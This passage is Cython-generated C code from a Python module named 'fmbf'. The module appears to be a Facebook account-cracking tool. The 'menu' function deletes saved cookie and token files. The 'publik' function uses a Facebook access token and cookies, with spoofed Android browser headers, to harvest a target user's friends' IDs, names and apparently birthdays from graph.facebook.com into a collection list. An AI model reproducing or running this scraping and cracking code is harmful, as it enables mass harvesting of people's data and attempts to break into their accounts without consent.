  __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_00, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 117, __pyx_L1_error)
  __pyx_t_16 = __pyx_t_15;
  __pyx_L34_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_15 = (__pyx_t_16 != 0);
  if (__pyx_t_15) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_1);
       {
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 118, __pyx_L36_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_remove); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 118, __pyx_L36_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_5, __pyx_kp_s_data_cookie_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_kp_s_data_cookie_txt);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 118, __pyx_L36_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      }
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L41_try_end;
      __pyx_L36_error:;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      
       {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L37_exception_handled;
      }
      __pyx_L37_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
      __pyx_L41_try_end:;
    }

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
       {
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 120, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_remove); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 120, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_8 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_kp_s_data_token_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_s_data_token_txt);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 120, __pyx_L42_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L47_try_end;
      __pyx_L42_error:;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      
       {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L43_exception_handled;
      }
      __pyx_L43_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L47_try_end:;
    }

    
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__22, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 122, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    
  }
  __pyx_L27:;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_AddTraceback("fmbf.Main.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v_cok);
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_4Main_9publik(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); 
static PyMethodDef __pyx_mdef_4fmbf_4Main_9publik = {"publik", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_4fmbf_4Main_9publik, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_4fmbf_4Main_9publik(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_user = 0;
  PyObject *__pyx_v_fields = 0;
  PyObject *__pyx_v_token = 0;
  PyObject *__pyx_v_cookie = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("publik (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_user,&__pyx_n_s_fields,&__pyx_n_s_token_2,&__pyx_n_s_cookie,0};
    PyObject* values[5] = {0,0,0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  5: values[4] = PyTuple_GET_ITEM(__pyx_args, 4);
        CYTHON_FALLTHROUGH;
        case  4: values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
        CYTHON_FALLTHROUGH;
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_user)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("publik", 1, 5, 5, 1); __PYX_ERR(0, 124, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_fields)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("publik", 1, 5, 5, 2); __PYX_ERR(0, 124, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  3:
        if (likely((values[3] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_token_2)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("publik", 1, 5, 5, 3); __PYX_ERR(0, 124, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  4:
        if (likely((values[4] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_cookie)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("publik", 1, 5, 5, 4); __PYX_ERR(0, 124, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "publik") < 0)) __PYX_ERR(0, 124, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 5) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
      values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
      values[4] = PyTuple_GET_ITEM(__pyx_args, 4);
    }
    __pyx_v_self = values[0];
    __pyx_v_user = values[1];
    __pyx_v_fields = values[2];
    __pyx_v_token = values[3];
    __pyx_v_cookie = values[4];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("publik", 1, 5, 5, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 124, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("fmbf.Main.publik", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_4fmbf_4Main_8publik(__pyx_self, __pyx_v_self, __pyx_v_user, __pyx_v_fields, __pyx_v_token, __pyx_v_cookie);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_4Main_8publik(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_user, PyObject *__pyx_v_fields, PyObject *__pyx_v_token, PyObject *__pyx_v_cookie) {
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  Py_UCS4 __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *(*__pyx_t_12)(PyObject *);
  int __pyx_t_13;
  Py_ssize_t __pyx_t_14;
  Py_ssize_t __pyx_t_15;
  int __pyx_t_16;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("publik", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
     {

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 126, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_connection, __pyx_kp_s_keep_alive) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_accept, __pyx_kp_s__23) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_dest, __pyx_n_s_empty) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_mode, __pyx_n_s_cors) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_site, __pyx_kp_s_same_origin) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_user, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_ch_ua_mobile, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_user_agent, __pyx_kp_s_Mozilla_5_0_Linux_Android_11_AC2) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      __pyx_v_headers = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_tampung); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 127, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 127, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_6 = ((__pyx_t_5 == 0) != 0);
      if (__pyx_t_6) {

        
        __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 128, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_access_token, __pyx_v_token) < 0) __PYX_ERR(0, 128, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_fields, __pyx_kp_u_name_friends_fields_id_name_birt) < 0) __PYX_ERR(0, 128, __pyx_L3_error)
        __pyx_v_params = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;

        
        goto __pyx_L9;
      }

      
       {
        __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 130, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_access_token, __pyx_v_token) < 0) __PYX_ERR(0, 130, __pyx_L3_error)
        __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 130, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_5 = 0;
        __pyx_t_8 = 127;
        __Pyx_INCREF(__pyx_kp_u_name_friends_fields_id_name_birt_2);
        __pyx_t_5 += 44;
        __Pyx_GIVEREF(__pyx_kp_u_name_friends_fields_id_name_birt_2);
        PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_name_friends_fields_id_name_birt_2);
        __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_v_fields, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 130, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_8;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
        __Pyx_GIVEREF(__pyx_t_9);
        PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_9);
        __pyx_t_9 = 0;
        __Pyx_INCREF(__pyx_kp_u__24);
        __pyx_t_5 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__24);
        PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u__24);
        __pyx_t_9 = __Pyx_PyUnicode_Join(__pyx_t_7, 3, __pyx_t_5, __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 130, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_fields, __pyx_t_9) < 0) __PYX_ERR(0, 130, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_v_params = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;
      }
      __pyx_L9:;

      
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_ses); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_graph_facebook_com, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = PyTuple_New(1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 131, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 131, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_cookies, __pyx_v_cookie) < 0) __PYX_ERR(0, 131, __pyx_L3_error)
      __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_4 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 131, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_v_url = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_s_friends); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 132, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_data); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 132, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
        __pyx_t_4 = __pyx_t_10; __Pyx_INCREF(__pyx_t_4); __pyx_t_5 = 0;
        __pyx_t_12 = NULL;
      } else {
        __pyx_t_5 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 132, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_12 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 132, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      for (;;) {
        if (likely(!__pyx_t_12)) {
          if (likely(PyList_CheckExact(__pyx_t_4))) {
            if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_4)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_10 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_5); __Pyx_INCREF(__pyx_t_10); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 132, __pyx_L3_error)
            #else
            __pyx_t_10 = PySequence_ITEM(__pyx_t_4, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 132, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            #endif
          } else {
            if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_4)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_5); __Pyx_INCREF(__pyx_t_10); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 132, __pyx_L3_error)
            #else
            __pyx_t_10 = PySequence_ITEM(__pyx_t_4, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 132, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            #endif
          }
        } else {
          __pyx_t_10 = __pyx_t_12(__pyx_t_4);
          if (unlikely(!__pyx_t_10)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 132, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_10);
        }
        __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_10);
        __pyx_t_10 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_idz); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 133, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_i, __pyx_n_s_id); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 133, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_9 = PyNumber_Add(__pyx_t_11, __pyx_kp_s__25); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 133, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_i, __pyx_n_s_name); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 133, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_7 = PyNumber_Add(__pyx_t_9, __pyx_t_11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 133, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_10, __pyx_t_7); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 133, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_sys); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_stdout); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_write); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = PyTuple_New(3); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_14 = 0;
        __pyx_t_8 = 127;
        __Pyx_INCREF(__pyx_kp_u_sedang_mengumpulkan);
        __pyx_t_14 += 26;
        __Pyx_GIVEREF(__pyx_kp_u_sedang_mengumpulkan);
        PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_kp_u_sedang_mengumpulkan);
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_idz); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
